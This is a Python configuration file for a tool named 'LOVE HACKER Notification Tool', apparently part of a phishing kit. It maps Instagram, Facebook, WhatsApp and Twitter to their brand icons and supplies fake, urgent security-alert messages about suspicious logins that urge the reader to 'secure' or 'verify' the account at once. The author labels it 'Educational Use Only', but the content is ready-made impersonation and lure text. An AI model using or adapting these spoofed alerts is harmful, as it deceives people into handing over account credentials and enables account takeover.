"""
Configuration file for LOVE HACKER Notification Tool
"""

# Default settings
DEFAULT_PORT = 8080
DEFAULT_ICONS = {
    'instagram': 'https://cdn-icons-png.flaticon.com/512/174/174855.png',
    'facebook': 'https://cdn-icons-png.flaticon.com/512/124/124010.png',
    'whatsapp': 'https://cdn-icons-png.flaticon.com/512/124/124034.png',
    'twitter': 'https://cdn-icons-png.flaticon.com/512/124/124021.png'
}

# Security messages
SECURITY_MESSAGES = {
    'instagram': "we detected unusual login activity from a new device. Your account may be at risk. Secure it now to prevent unauthorized access.",
    'facebook': "suspicious activity detected on your account. Someone tried to login from an unrecognized device. Secure your account immediately.",
    'whatsapp': "new login detected from unknown device. Verify your account to maintain security.",
    'default': "unusual activity detected on your account. Click to secure your account immediately."
}

# Tool information
TOOL_INFO = {
    'name': 'LOVE HACKER Notification Tool',
    'version': '2.0',
    'author': 'LOVE ❤ HACKER',
    'purpose': 'Educational Use Only'
}
